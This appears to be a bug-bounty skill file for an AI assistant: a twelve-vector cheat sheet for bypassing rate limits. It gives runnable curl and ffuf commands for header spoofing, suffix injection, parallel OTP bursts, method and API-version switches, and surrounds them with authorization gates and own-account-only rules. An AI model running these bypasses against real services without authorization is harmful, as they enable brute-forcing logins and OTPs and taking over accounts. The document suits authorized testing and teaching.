---
name: hunt-rate-limit
description: "Hunt rate-limit bypass — the 12-vector cheat sheet: IP rotation, X-Forwarded-For / X-Originating-IP / X-Remote-IP / X-Client-IP / X-Host header spoofing (incl. 127.0.0.2/3 and double headers), user-agent/cookie rotation, null-byte and whitespace suffixes (%00 %0d %0a %09 %0C %20) on endpoints and param values, alternating valid/invalid logins to fool the counter, race conditions, random params, body-format switch (form/JSON/XML), method switch (POST/PUT/GET), captcha-bypass link-out, Gmail +/. trick, API version switch (v2 to v1). Companion to hunt-brute-force (which owns the four rate-limit states, OTP keyspace math, and shadow-throttle detection). Every vector is gated by the program's own rules first — many programs explicitly exclude bypass via IP/device rotation."
category: security
risk: offensive
source: https://github.com/tuhin1729/Bug-Bounty-Methodology/blob/main/RateLimit.md
source_repo: tuhin1729/Bug-Bounty-Methodology
source_type: community
date_added: '2026-11-27'
date_updated: '2026-11-27'
license: MIT
license_source: https://github.com/tuhin1729/Bug-Bounty-Methodology/blob/main/LICENSE
compatibility: Requires a target the researcher named + authorized in that conversation, a frozen SCOPE.md, and the bounty gate passed. Docs + commands only; no bundled scripts.
sources: community, public_research
report_count: 0
---
> **⚠️ AUTHORIZED USE ONLY**
> This skill is for authorized security assessments only. Use it only for a
> target the researcher named and authorized in that conversation, inside the frozen
> scope, after the bounty gate passed. No Immunefi-hosted programs. No
> deposit-first programs. No on-chain tx, no KYC, no filing, no spend
> without his explicit approval for that exact step. Testing is manual-style,
> low-volume, targeted — never high-volume automated scanning where the
> program bans it. No DoS. No credential stuffing. No accessing anyone
> else's data. Own test accounts only.

> **Mandatory confirmation gate**
> Before running any command that probes, exploits, changes, persists on, extracts data from, or attempts credential access against a target:
> 1. Ask the user to state the exact target URL, IP, account, or resource.
> 2. Ask the user to confirm written authorization and the permitted scope.
> 3. Show the exact command(s) and explain their expected effect.
> 4. Wait for explicit confirmation in the current conversation.
>
> Without that confirmation, remain read-only and provide defensive guidance only.

# HUNT-RATE-LIMIT — Rate-Limit Bypass (12 vectors)

> Grounding note: the 12 vectors below are the "Bypassing Rate Limit
> Protection" cheat sheet from tuhin1729/Bug-Bounty-Methodology
> (`RateLimit.md`, MIT), which the researcher sent as a screenshot on 2026-11-27
> — the screenshot text matches the vendored file at
> `~/workspace/vendor/Bug-Bounty-Methodology/RateLimit.md` almost
> verbatim (the screenshot adds the valid/invalid-login alternation as
> vector 5; the file lists 11 vectors + race condition). `report_count`
> is intentionally `0` — do not cite a payout or report ID you cannot
> verify. This skill is the bypass-technique companion to
> `hunt-brute-force`, which owns the four rate-limit states, the OTP
> keyspace math, and the shadow-throttle detector. Read that skill first
> when the target is a login/OTP/reset endpoint.

## Program rules first — bypass is not always testable

**Check the program's rules in the frozen SCOPE.md / bounty gate
BEFORE running any bypass vector below.** Many bounty programs
explicitly exclude rate-limit bypass via IP/device rotation, and some
exclude rate-limit findings entirely. The standing rule from the
`bb-recon-pipeline` adaptation (2026-11-23) is: rate-limit testing is
observe-only unless the program's rules allow bypass testing.

- **Program allows bypass testing** → run the vectors below, low-volume,
  on your own test account, one vector at a time.
- **Program excludes bypass (or is silent and the gate is strict)** →
  observe-only: record the limit (429 / lockout / cooldown after N
  attempts), note the bypass vectors for the record, do NOT execute
  them. A documented limit is not a finding; an untested bypass is not
  a finding either.
- **Program excludes rate limits entirely** → skip this skill for that
  target.

## Baseline first — find the limit before trying to bypass it

Every bypass claim needs a baseline: the limit must be real, observed,
and reproducible. On your own test account, send a small burst (10–20
requests, 0.1s apart) at the endpoint and record status + body + latency
per attempt:

```bash
TARGET="target.example.com"
for i in $(seq 1 20); do
  curl -s -o /tmp/rl_base -w "attempt $i: status=%{http_code} time=%{time_total}s len=%{size_download}\n" \
    -X POST "https://$TARGET/api/login" \
    -H "Content-Type: application/json" \
    -d "{\"email\":\"own-test@example.com\",\"password\":\"wrong$i\"}"
  sleep 0.1
done
```

- `429` / `403` / lockout message / CAPTCHA after N attempts → a limit
  exists at N. Record N, the status, and the message. That is the
  baseline every vector below is measured against.
- Nothing changes across all 20 → candidate "no effective limit" — but
  classify against the four states in `hunt-brute-force` first (hard
  lockout / soft IP throttle / CAPTCHA injection / silent
  shadow-throttle). A silent shadow-throttle (correct values stop
  working under load while status stays 200) is the trap: run the
  known-good seed test from `hunt-brute-force` before concluding
  anything.

## The 12 vectors

Run ONE vector at a time, same endpoint, same own test account. For
each, the proof is always a delta: with the vector, requests past the
baseline N succeed; without it, they hit the limit again. A single fast
run with no baseline comparison is not a bypass.

### 1. IP rotation

If the limit is keyed on source IP, a fresh IP per request defeats it.
From the sandbox / hermes-wb you cannot change egress IP with curl —
the practical test is vector 2 (header spoofing), which is what most
apps actually trust. True rotation needs a different egress (VPN exit,
proxy pool, or the laptop's IP) — use it only if the program allows it
and the rotation source is yours. Do NOT rent botnet/residential proxy
pools for a bounty target.

### 2. Header spoofing (X-Forwarded-For and friends)

The most testable vector: the app may trust a client-controlled header
as the client IP. Try each header alone first, then combined. Values:
`127.0.0.1`, then `127.0.0.2`, `127.0.0.3`, … — a new value per
request. Also try double headers and comma-joined values; some parsers
take the first value, some the last.

```bash
# One header, rotating value per request (past the baseline N):
for i in $(seq 1 30); do
  IP="127.0.0.$((i % 250 + 2))"
  curl -s -o /dev/null -w "attempt $i (XFF $IP): %{http_code}\n" \
    -H "X-Forwarded-For: $IP" \
    -X POST "https://$TARGET/api/login" \
    -H "Content-Type: application/json" \
    -d "{\"email\":\"own-test@example.com\",\"password\":\"wrong$i\"}"
  sleep 0.1
done

# Header set to try one at a time (same loop, swap the -H line):
#   -H "X-Originating-IP: $IP"
#   -H "X-Remote-IP: $IP"
#   -H "X-Remote-Addr: $IP"
#   -H "X-Client-IP: $IP"
#   -H "X-Host: $IP"
#   -H "X-Forwarded-Host: $IP"
#   -H "X-Real-IP: $IP" -H "CF-Connecting-IP: $IP" -H "True-Client-IP: $IP"

# Double X-Forwarded-For (empty first, value second):
curl -s -X POST "https://$TARGET/api/login" \
  -H "X-Forwarded-For:" -H "X-Forwarded-For: 127.0.0.1" \
  -H "Content-Type: application/json" \
  -d '{"email":"own-test@example.com","password":"wrong"}'

# Comma-joined (first-vs-last parser test):
curl -s -X POST "https://$TARGET/api/login" \
  -H "X-Forwarded-For: 127.0.0.1, 203.0.113.7" \
  -H "Content-Type: application/json" \
  -d '{"email":"own-test@example.com","password":"wrong"}'
```

**Confirmed when:** requests past baseline N return the pre-limit
response (no 429/lockout) with a spoofed header, AND re-running the
baseline without the header brings the 429 back. If the header changes
nothing, the app reads the real source IP — record it and move on.

### 3. User-agent / cookie rotation

If the limit is keyed on UA string or session cookie, rotating them
resets the counter. Small inline rotation — no wordlist needed:

```bash
UAS=(
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
  "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0"
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.2 Safari/605.1.15"
  "curl/8.5.0"
)
for i in $(seq 1 30); do
  UA="${UAS[$((i % ${#UAS[@]}))]}"
  curl -s -o /dev/null -w "attempt $i: %{http_code}\n" \
    -A "$UA" -H "Cookie: session=rotated-$i" \
    -X POST "https://$TARGET/api/login" \
    -H "Content-Type: application/json" \
    -d "{\"email\":\"own-test@example.com\",\"password\":\"wrong$i\"}"
  sleep 0.1
done
```

**Confirmed when:** the 429 disappears with rotation and returns
without it. Note: rotating the *session cookie* only matters if the
limit is per-session; if the limit is per-account, a fresh session does
not help — that negative result is itself a useful observation.

### 4. Null-byte / whitespace suffixes

Appending `%00`, `%0d`, `%0a`, `%09`, `%0C`, or `%20` to the endpoint
(or after a parameter value) can make the rate limiter see a different
key than the router does — the limiter keys on the raw path while the
app normalizes it, or vice versa.

```bash
# Suffix on the endpoint (one suffix per run, past baseline N):
for SUF in "%00" "%0d%0a" "%0d" "%0a" "%09" "%0C" "%20"; do
  echo "== suffix $SUF =="
  for i in $(seq 1 12); do
    curl -s -o /dev/null -w "  attempt $i: %{http_code}\n" \
      -X POST "https://$TARGET/forgot-password$SUF" \
      -d "email=own-test@example.com"
    sleep 0.1
  done
done

# Suffix after the parameter value:
curl -s -X POST "https://$TARGET/forgot-password" \
  -d "email=own-test@example.com%20" -w "\nstatus=%{http_code}\n"
```

**Confirmed when:** the suffixed endpoint accepts requests past N
while the clean endpoint 429s at N — AND the suffixed request actually
performs the action (e.g. the reset email is really sent to your own
test inbox, or the response body matches a successful submission).
A 200 that returns an error page is not a bypass. Also verify the
suffix did not just 404: a 404 is not a bypass either.

### 5. Alternating valid / invalid logins

Some counters reset (or never increment) on a successful login. Log in
to your valid test account, then immediately try an invalid one, and
repeat — the valid login in between can fool a counter that only counts
consecutive failures.

```bash
for i in $(seq 1 10); do
  # Valid login (your own test account) — resets the counter if the bug exists:
  curl -s -o /dev/null -w "valid: %{http_code}\n" \
    -X POST "https://$TARGET/api/login" -H "Content-Type: application/json" \
    -d '{"email":"own-test@example.com","password":"correct-horse-battery"}'
  # Invalid login right after — should 429 at N if the counter worked:
  curl -s -o /dev/null -w "invalid $i: %{http_code}\n" \
    -X POST "https://$TARGET/api/login" -H "Content-Type: application/json" \
    -d "{\"email\":\"own-test@example.com\",\"password\":\"wrong$i\"}"
  sleep 0.2
done
```

**Confirmed when:** invalid attempts past baseline N keep returning
401 (not 429/lockout) only when interleaved with valid logins, and the
same invalid attempts without interleaving do hit the limit. If the
app locks after N *total* failures regardless of interleaving, there is
no bug — record it.

### 6. Race condition

Send the requests in parallel so they all arrive before the counter
increments. A single-packet / parallel burst is the test; the impact
depends on what the endpoint does (OTP verify, coupon redeem, reset
code — see `hunt-brute-force` for the OTP keyspace math). Reference:
the Microsoft-account case in the vendored file
(thezerohack.com/how-i-might-have-hacked-any-microsoft-account).

```bash
# 20 parallel attempts; the counter should have stopped all but N of them.
seq 1 20 | xargs -P 20 -I{} curl -s -o /dev/null -w "attempt {}: %{http_code}\n" \
  -X POST "https://$TARGET/api/verify-otp" \
  -H "Content-Type: application/json" -H "Cookie: $SESSION_COOKIE" \
  -d '{"otp":"000000"}'
```

**Confirmed when:** more requests succeed (or are processed) than the
limit allows — e.g. the limit is 5/min but 12 parallel requests all
return processed responses. Count successes, not just 200s: a 200 that
says "already used / expired" is not a success. Keep the burst small
(10–20); a large burst is a DoS test, which is excluded.

### 7. Random parameters

Adding a junk query or body parameter can change the limiter's cache
key while the app ignores it.

```bash
# Random query param:
curl -s -X POST "https://$TARGET/forgot-password?fake=1" \
  -d "email=own-test@example.com&alsofake=2" -w "\nstatus=%{http_code}\n"

# Vary it per request past baseline N:
for i in $(seq 1 20); do
  curl -s -o /dev/null -w "attempt $i: %{http_code}\n" \
    -X POST "https://$TARGET/forgot-password?fake=$i" \
    -d "email=own-test@example.com&alsofake=$i"
  sleep 0.1
done
```

**Confirmed when:** requests past N succeed with the junk param and
429 without it, and the action genuinely executes (reset email sent to
your own inbox). If the app 400s on unknown params, there is no bug.

### 8. Body-format switch

The limiter may only watch one content type. If the endpoint accepts
form, JSON, and XML, try the same request in each format.

```bash
# form (baseline):
curl -s -X POST "https://$TARGET/forgot-password" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "email=own-test@example.com" -w "\nform: %{http_code}\n"
# JSON:
curl -s -X POST "https://$TARGET/forgot-password" \
  -H "Content-Type: application/json" \
  -d '{"email":"own-test@example.com"}' -w "\njson: %{http_code}\n"
# XML:
curl -s -X POST "https://$TARGET/forgot-password" \
  -H "Content-Type: application/xml" \
  -d '<root><email>own-test@example.com</email></root>' -w "\nxml: %{http_code}\n"
```

**Confirmed when:** one format 429s at N while another keeps
accepting past N — and the accepted format actually performs the
action (not just a 200 with "unsupported media type" or an error
body). Check the response body, not just the status.

### 9. Method switch

Same idea as vector 8, on the method: POST → PUT / GET / PATCH /
DELETE / HEAD / OPTIONS.

```bash
for M in POST PUT GET PATCH DELETE; do
  echo "== $M =="
  curl -s -o /dev/null -w "  %{http_code}\n" -X "$M" \
    "https://$TARGET/forgot-password" \
    -d "email=own-test@example.com"
done
# Then burst the method that did NOT 429 in the baseline, past N:
for i in $(seq 1 15); do
  curl -s -o /dev/null -w "PUT attempt $i: %{http_code}\n" -X PUT \
    "https://$TARGET/forgot-password" -d "email=own-test@example.com"
  sleep 0.1
done
```

**Confirmed when:** the alternate method accepts past N and performs
the action, while POST 429s at N. A 405 (method not allowed) is not a
bypass; a 200 that does nothing is not a bypass.

### 10. Captcha bypass

If the rate limit is enforced by a CAPTCHA, the bypass lives in the
CAPTCHA, not the limiter. **Do not duplicate that work here — use
`hunt-captcha-bypass`.** Its checks (token replay, single-use vs
reusable tokens, verify endpoint enforced server-side or skipped on the
API path, same token across sessions) decide whether the CAPTCHA is
real. If the CAPTCHA is sound, the rate limit behind it stands.

### 11. Gmail +/. trick

Gmail ignores dots in the local part and everything after `+`, so
`own.test+1@gmail.com`, `owntest+2@gmail.com`, and
`owntest@gmail.com` are the same inbox but look like different
accounts to a per-email limiter. **Own Gmail only, never anyone
else's address.**

```bash
for i in 1 2 3 4 5; do
  curl -s -X POST "https://$TARGET/forgot-password" \
    -d "email=owntest+$i@gmail.com" -w "\n[$i] %{http_code}\n"
done
# Dot variant: o.wntest@gmail.com, ow.ntest@gmail.com, ...
```

**Confirmed when:** reset/signup requests for the `+N` / dotted
variants all succeed past the per-email limit, and the emails all
arrive in the same (your own) inbox. If the app normalizes the email
(strips dots/`+tag`) before counting, there is no bug. This vector
only matters on per-email limits (signup, reset, invite); it does
nothing against per-IP or per-account limits.

### 12. API version switch

An older API version may predate the rate limit. Try the same call on
`v1` when the app defaults to `v2` (and vice versa).

```bash
curl -s -X POST "https://$TARGET/api/v2/1729/confirm-email" \
  -H "Content-Type: application/json" -d '{"code":"000000"}' -w "\nv2: %{http_code}\n"
curl -s -X POST "https://$TARGET/api/v1/1729/confirm-email" \
  -H "Content-Type: application/json" -d '{"code":"000000"}' -w "\nv1: %{http_code}\n"
```

**Confirmed when:** the older version accepts past N while the current
version 429s at N, and the old version actually performs the action
(code accepted, email confirmed — on your own test account). A 404 on
the old version is not a bypass; a 200 that does nothing is not a
bypass.

## Automation — ffuf for the header/param vectors

```bash
# ---- ffuf: X-Forwarded-For rotation (vector 2) ----
# Build a small IP list (no wordlist needed for a PoC probe):
printf "127.0.0.2\n127.0.0.3\n127.0.0.4\n127.0.0.5\n127.0.0.6\n127.0.0.7\n127.0.0.8\n127.0.0.9\n127.0.0.10\n127.0.0.11\n" > /tmp/xff_ips.txt
ffuf -u "https://$TARGET/api/login" -X POST \
  -H "Content-Type: application/json" -H "X-Forwarded-For: FUZZ" \
  -d '{"email":"own-test@example.com","password":"wrong"}' \
  -w /tmp/xff_ips.txt \
  -mc all -ac -rate 10 -t 5
# -mc all + -ac so you SEE 429s instead of filtering them out.
# A bypass shows as: all 10 requests return the pre-limit response.

# ---- ffuf: suffix fuzz (vector 4) ----
printf "%%00\n%%0d%%0a\n%%0d\n%%0a\n%%09\n%%0C\n%%20\n" > /tmp/suffixes.txt
ffuf -u "https://$TARGET/forgot-passwordFUZZ" -X POST \
  -d "email=own-test@example.com" \
  -w /tmp/suffixes.txt \
  -mc all -ac -rate 10 -t 5
# Compare each suffix's status/body against the clean baseline.
# ffuf 2.1.0 on hermes-wb: /usr/local/bin/ffuf. Use -s (not -silent, which does not exist).
# Keep -rate low (10) and threads low (5) — this is a PoC probe, not a flood.
```

## CONFIRMED vs false positive

A bypass is CONFIRMED only when all of these hold:

1. **Baseline exists.** The limit was observed first (429 / lockout /
   cooldown at N) on the clean request, on your own test account.
2. **Delta proof.** With the vector, requests past N succeed; without
   it (same endpoint, same account, same minute), they hit the limit
   again. Toggle the vector off and show the 429 return — the delta IS
   the proof.
3. **The action really executes.** The response body matches a
   successful action, not an error page with a 200. For reset/signup:
   the email actually arrives in your own test inbox. For OTP: the code
   is genuinely accepted. For login: a session is actually created.
4. **Not a shadow throttle.** The known-good seed test from
   `hunt-brute-force` passes — the correct value still authenticates
   under burst load. If it does not, the endpoint is silently dropping
   submissions and the "bypass" is an illusion.
5. **Not a different endpoint.** The vector did not silently route to a
   different handler (404, 405, "unsupported media type", or a
   differently-named endpoint that never had a limit). The bypassed
   request must hit the same logic as the limited one.

False positives that look like bypasses but are not:
- A 200 with an error body ("too many attempts" in JSON, "please try
  later" HTML) — status alone means nothing.
- A 404/405 on the suffixed / re-methoded / old-version endpoint — the
  limit never applied there because the endpoint does not exist.
- The limit is per-account and you switched accounts — that is not a
  bypass, that is a different account.
- The limit window expired between your baseline and your vector run —
  re-run the baseline immediately before the vector, in the same minute.

## Severity

Severity follows what the bypass unlocks, not the bypass itself:

- **Critical** — bypass unlocks OTP / MFA / password-reset-code brute
  to a demonstrated ATO path (see `hunt-brute-force` for the keyspace
  math that justifies it).
- **High** — bypass unlocks login brute force / credential stuffing
  against real accounts, or a paid/limited resource (coupon, gift
  card, referral) at scale.
- **Medium** — bypass unlocks mass account creation / signup spam /
  invite abuse, or a per-email limit defeat with a concrete abuse path.
- **Low** — a bypass exists but the endpoint has no security impact
  (e.g. a public newsletter signup with a limit).
- **Informational** — a limit is missing or bypassable but no reachable
  impact was demonstrated. A rate-limit gap with no impact is not
  Medium.

## Validation — before any report

1. Validate with Claude AND GPT (vault Anthropic helper for Claude;
   BeastFarmer gpt-6-luna / Junie Lite for GPT, English prompts only).
2. **Validation alone is never final — execution test + recheck
   required.** The delta proof (vector on vs off) must be re-runnable
   from the evidence (commands + responses saved).
3. Evidence attached: baseline log (N + status + message), vector run
   log, toggle-off re-run showing the 429 return, and proof the action
   executed (inbox receipt / session created / code accepted).
4. Humanize the report (`humanizer` skill): no em dashes, no
   bold-label lists, no triads, no staged openers, sentence-case
   headings.
5. Combine valid bugs into one report unless the program's rules
   require one report per bug. File only with the researcher's explicit approval
   for that exact filing, and only when the Bugcrowd 1-pending-review
   slot is free (bank it otherwise).

## Limitations

- Authorized scope only: the confirmation gate above is mandatory before
  any probing. The bounty gate (`bounty_gate.py`) and `scope-check`
  run before any target-touching recon.
- Program rules govern: if the program excludes bypass testing, this
  skill is observe-only for that target. Never reframe an excluded
  bypass as "recon" to run it anyway.
- Docs-only import: no bundled scripts. The curl/ffuf commands above
  are the whole tooling; review any third-party tool before installing.
- No bulk brute-force, no DoS, no credential stuffing, no real-user
  data. Own test accounts and synthetic canaries only. Small probe
  counts (10–30 requests) with delays; never a flood.
- Captcha vectors live in `hunt-captcha-bypass`; OTP keyspace math,
  the four rate-limit states, and the shadow-throttle detector live in
  `hunt-brute-force`. Do not re-derive them here.

## Local adaptation — Muse (the assistant), 27 Nov 2026

Standing rules that override upstream on conflict:
- Scope gate first: frozen SCOPE.md + bounty gate + scope-check before
  any active test. No Immunefi-hosted programs. No deposit-first
  programs.
- No mainnet transaction, signature, mint, payment, or report
  submission without the user's explicit "gas" tap after a preview.
- No private keys, seeds, or API keys in skill content; keys only via
  Secure Vault or an approved connector.
- No credential stuffing, breached credentials, mass guessing, OTP
  brute-force, or real-user data extraction.
- Owned test accounts and synthetic canaries only.
- Independent re-check before any draft is shown to the user.
- Adapted from tuhin1729/Bug-Bounty-Methodology `RateLimit.md` (MIT)
  and the matching "Bypassing Rate Limit Protection" cheat sheet
  the researcher sent 2026-11-27. The frogy2.0 repo
  (iamthefrogy/frogy2.0, "Orbis") was reviewed from the same input
  and is NOT adopted as a tool: its README declares the project
  ABANDONED in favour of frogscope, and its quick-start runs
  `chmod 777 *` plus a `--privileged --cap-add=NET_RAW --network host`
  Docker container. Only Orbis's risk-scoring model was adapted, as a
  prioritization section in `bb-recon-pipeline` — the tool itself was
  never installed, cloned, or run.
